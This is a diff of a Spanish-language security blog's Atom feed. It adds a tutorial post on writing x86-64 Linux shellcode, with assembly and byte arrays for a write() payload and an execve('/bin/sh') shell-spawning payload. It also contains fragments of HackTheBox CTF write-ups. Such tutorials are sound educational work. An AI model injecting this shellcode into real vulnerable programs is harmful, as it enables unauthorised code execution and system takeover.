@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-05T18:26:29-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-07T19:10:08-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
 </subtitle><author><name>Omar</name></author><entry><title type="html">Un Poco de Pentesting Web - SSTI en Jinja2</title><link href="/blog/posts/2023-05-29-UPDPW-ssti/" rel="alternate" type="text/html" title="Un Poco de Pentesting Web - SSTI en Jinja2" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-05-31T19:55:38-06:00</updated><id>/blog/posts/UPDPW-ssti</id><content type="html" xml:base="/blog/posts/2023-05-29-UPDPW-ssti/">&lt;center style=&quot;font-size: 14px&quot; class=&quot;lead&quot;&gt;(soy ese)&lt;/center&gt;
 
 &lt;h2 id=&quot;flask-y-jinja&quot;&gt;Flask y Jinja&lt;/h2&gt;
@@ -227,7 +227,254 @@
 
 &lt;p&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&quot;&gt;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="SSTI" /><summary type="html">(soy ese)</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/UPDWP-ssti/waifu.jpg" /><media:content medium="image" url="/assets/img/UPDWP-ssti/waifu.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="/blog/posts/2023-05-23-htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-pc</id><content type="html" xml:base="/blog/posts/2023-05-23-htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.&lt;/p&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="SSTI" /><summary type="html">(soy ese)</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/UPDWP-ssti/waifu.jpg" /><media:content medium="image" url="/assets/img/UPDWP-ssti/waifu.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Shellcodes - syscall write() y execve(bin/sh)</title><link href="/blog/posts/2023-05-29-maldev-shellcodes/" rel="alternate" type="text/html" title="Shellcodes - syscall write() y execve(bin/sh)" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-06-07T19:10:08-06:00</updated><id>/blog/posts/maldev-shellcodes</id><content type="html" xml:base="/blog/posts/2023-05-29-maldev-shellcodes/">&lt;p&gt;Que onda, esta vez te voy a enseñar a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcodes&quot;&gt;Shellcodes&lt;/h2&gt;
+
+&lt;p&gt;Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo&lt;/p&gt;
+
+&lt;p&gt;Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls&lt;/p&gt;
+
+&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
+
+&lt;p&gt;Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ola&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;void main()&lt;/code&gt;. pero la cantidad de syscalls que hace es increible, usaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace&lt;/code&gt; para interceptar y registrar todas las syscalls que hace nuestro binario: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace ./binario&lt;/code&gt;, y esto arroja:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve(&quot;./prueba&quot;, [&quot;./prueba&quot;], 0x7ffc3236ede0 /* 57 vars */) = 0
+brk(NULL)                               = 0x5555f3c59000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/lib/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\20:\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
+mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
+mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
+mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
+mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
+arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
+set_tid_address(0x7fde591ce910)         = 60068
+set_robust_list(0x7fde591ce920, 24)     = 0
+rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
+mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
+mprotect(0x5555f2670000, 4096, PROT_READ) = 0
+mprotect(0x7fde59229000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7fde591cf000, 167079)          = 0
+newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
+getrandom(&quot;\x52\x39\x5a\x38\x9f\x83\x1b\x9e&quot;, 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x5555f3c59000
+brk(0x5555f3c7a000)                     = 0x5555f3c7a000
+write(1, &quot;ola\n&quot;, 4ola
+)                    = 4
+exit_group(4)                           = ?
++++ exited with 4 +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.&lt;/p&gt;
+
+&lt;p&gt;A lo que quiero llega es que cada instruccion que hacemos en los lenguajes de programacion, tiene una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.&lt;/p&gt;
+
+&lt;p&gt;Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall(rdi,rsi,rdx,r10,r8,r9)&lt;/code&gt;, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcode-usando-write&quot;&gt;Shellcode usando write()&lt;/h2&gt;
+
+&lt;p&gt;Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;size_t count: Es el numero de bytes que se van a escribir&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora toca programiar en ensamblador:&lt;/p&gt;
+
+&lt;p&gt;Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section .text&lt;/code&gt; le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt;, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.&lt;/p&gt;
+
+&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;global _start&lt;/code&gt; le estoy diciendo que exporte los simbolos a partir de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt;, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).&lt;/p&gt;
+
+&lt;p&gt;Y dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; va todo nuestro codigo, y el programa completo se veria asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+        global _start:
+
+_start:
+        mov rax, 1
+        mov rsi, 0x616e757a614e
+        push rsi
+        mov rsi, rsp
+        mov rdx, 6
+        syscall  
+        mov rax, 60
+        syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 1&lt;/code&gt; estamos copiando el numero 1, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, 0x616e757a614e&lt;/code&gt; le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y en este caso, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; va a funcionar como puntero al valor que se va a escribir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rsi&lt;/code&gt; Esta poniendo el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Aqui le indicamos que copie la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y ahora si, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; apunta al valor que vamos a imprimir el cual esta en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdx, 6&lt;/code&gt; Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; se hace el llamado a write&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctante&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Ojo&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: “Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y &lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit&quot;&gt;aca&lt;/a&gt; lo dice”. Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.&lt;/p&gt;
+
+&lt;p&gt;Haciendo una comparacion con la estructura de write, y las intrucciones en ensamblador, asi se llamaria a write:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora procedemos a compilar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nasm -f elf64 shellcode.asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos dejara un archivo .o el cual debemos de enlazar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld -m elf_x86_64 -s -o write shellcode.o&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objcopy -j .text -O binary shellcode.o write.bin&lt;/code&gt; para generar un archivo .bin&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump -v -e '&quot;\\&quot; 1/1 &quot;x%02x&quot;' write.bin; echo&lt;/code&gt; para imprimir el byte array&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shellcode-para-conseguir-una-shell&quot;&gt;Shellcode para conseguir una shell&lt;/h2&gt;
+
+&lt;p&gt;Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
+    global _start
+
+_start:
+
+    xor rdx, rdx
+    push rdx
+    mov rax, 0x68732f2f6e69622f
+    push rax
+    mov rdi, rsp
+    push rdx
+    push rdi
+    mov rsi, rsp
+    xor rax, rax
+    mov al, 0x3b
+    syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Explicare directamente lo que esta dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; por que lo demas ya saben que hace&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; El registo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt; haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 0x68732f2f6e69622f&lt;/code&gt; Copiamos /bin/sh al registro rax (la cadena esta en hex)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rax&lt;/code&gt; Metemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; al stack para que pueda ser accedida por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdi, rsp&lt;/code&gt; Copiamos la direccion de /bin/sh en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, la cual sera el primer argumento de execve, en ese momento el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; apunta a la direccion de /bin/sh&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos otro byte nulo al stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdi&lt;/code&gt; Metemos la direccion de /bin/sh en el stack&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Copiamos la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rax, rax&lt;/code&gt; Lo mismo que el primer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov al, 0x3b&lt;/code&gt; Copiamos el valor 0x3b que representa el numero de la syscall, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;al&lt;/code&gt; que funciona como un byte inferior de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, y por ultimo se ejecuta la syscall&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y si ejecutamos, nos da una shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y listo, tenemos otra shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.&lt;/p&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/shellcode/waifu.gif" /><media:content medium="image" url="/assets/img/shellcode/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="/blog/posts/2023-05-23-htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-pc</id><content type="html" xml:base="/blog/posts/2023-05-23-htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.&lt;/p&gt;
 
 &lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
 
@@ -1940,257 +2187,4 @@ bash-5.1# cat /root/root.txt
 f46884c23c53cc716ac549803*******
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/busqueda/waifu.gif" /><media:content medium="image" url="/assets/img/busqueda/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Squashed - NFS y X11</title><link href="/blog/posts/2023-04-05-htb-squashed/" rel="alternate" type="text/html" title="HackTheBox Squashed - NFS y X11" /><published>2023-04-05T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-squashed</id><content type="html" xml:base="/blog/posts/2023-04-05-htb-squashed/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
-&lt;h3 id=&quot;ecaneos-con-nmap&quot;&gt;Ecaneos con nmap&lt;/h3&gt;
-
